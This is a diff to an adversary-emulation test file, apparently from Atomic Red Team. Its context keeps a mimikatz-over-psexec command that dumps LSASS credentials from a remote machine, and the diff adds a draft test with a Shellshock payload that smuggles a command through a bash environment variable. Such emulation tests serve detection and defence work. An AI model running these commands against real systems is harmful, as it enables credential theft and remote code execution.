@@ -34,7 +34,6 @@ atomic_tests:
   auto_generated_guid: 3203ad24-168e-4bec-be36-f79b13ef8a83
   description: |
     Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).
-    Especially useful against domain controllers in Active Directory environments.
     It must be executed in the context of a user who is privileged on remote `machine`.
 
     The effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>
@@ -82,3 +81,32 @@ atomic_tests:
       #{psexec_path} /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa /inject /id:500" "exit"
     name: command_prompt
     elevation_required: false # locally not, but remotely on target machine then yes
+
+- name: Execute Shellshock Commands on Linux 
+  description: |
+    Executes Commands unsing the portraying the shellshock vulnerability
+
+  supported_platforms:
+    - linux
+
+#  input_arguments:
+#    output_file:
+#      description: TODO
+#      type: TODO
+#      default: TODO
+
+#  dependency_executor_name: powershell # (optional) The executor for the prereq commands, defaults to the same executor used by the attack commands.
+#  dependencies: # (optional)
+#    - description: |
+#        TODO
+#      prereq_command: | # Commands to check if prerequisites for running this test are met. For the "command_prompt" executor, if any command returns a non-zero exit code, the prerequisites are not met. For the "powershell" executor, all commands are run as a script block and the script block must return 0 for success.
+#        TODO
+#      get_prereq_command: | # Commands to meet this prerequisite or a message describing how to meet this prerequisite.
+#        TODO
+
+  executor:
+    name: bash
+    command: | # These are the actaul attack commands, at least one command must be provided.
+      sudo env x='() { :;}; echo shellshockverwundbar' bash -c "" 
+#    cleanup_command: | # You can remove the cleanup_command section if there are no cleanup commands.
+#      TODO
